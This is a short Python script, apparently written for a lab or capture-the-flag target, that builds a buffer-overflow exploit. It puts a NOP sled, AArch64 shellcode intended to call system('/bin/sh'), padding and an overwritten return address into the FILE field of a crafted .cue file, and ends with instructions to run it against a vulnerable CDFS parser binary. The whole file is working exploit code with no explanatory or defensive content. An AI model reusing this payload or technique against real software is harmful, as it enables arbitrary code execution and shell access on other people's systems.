#!/usr/bin/env python3
"""
Create exploit payload for patched binary
"""

# Same shellcode that calls system("/bin/sh")
shellcode = bytes([
    0xe0, 0x47, 0x9e, 0xd2,  # movz x0, #0xf23f
    0xe0, 0xff, 0xbf, 0xf2,  # movk x0, #0xffff, lsl #16
    0xe0, 0xff, 0xdf, 0xf2,  # movk x0, #0xffff, lsl #32
    0x9e, 0x9d, 0x99, 0xd2,  # movz x30, #0xcec4
    0x7e, 0xfc, 0xbe, 0xf2,  # movk x30, #0xf7e3, lsl #16
    0xfe, 0xff, 0xdf, 0xf2,  # movk x30, #0xffff, lsl #32
    0xc0, 0x03, 0x5f, 0xd6,  # ret
])

nop = b"\x1f\x20\x03\xd5"
nop_sled = nop * 400

payload = nop_sled + shellcode
payload = payload.ljust(2144, b"A")
payload += b"\x48\xe3\xff\xff\xff\xff\xff\xff"

with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "')
    f.write(payload)
    f.write(b'" BINARY\n')
    f.write(b'TRACK 01 MODE1/2352\n')
    f.write(b'  INDEX 01 00:00:00\n')

print("âœ“ Exploit payload created!")
print("\nRun the exploit:")
print("  ./vuln_cdfs_patched formats/cdfs/overflow.cue")
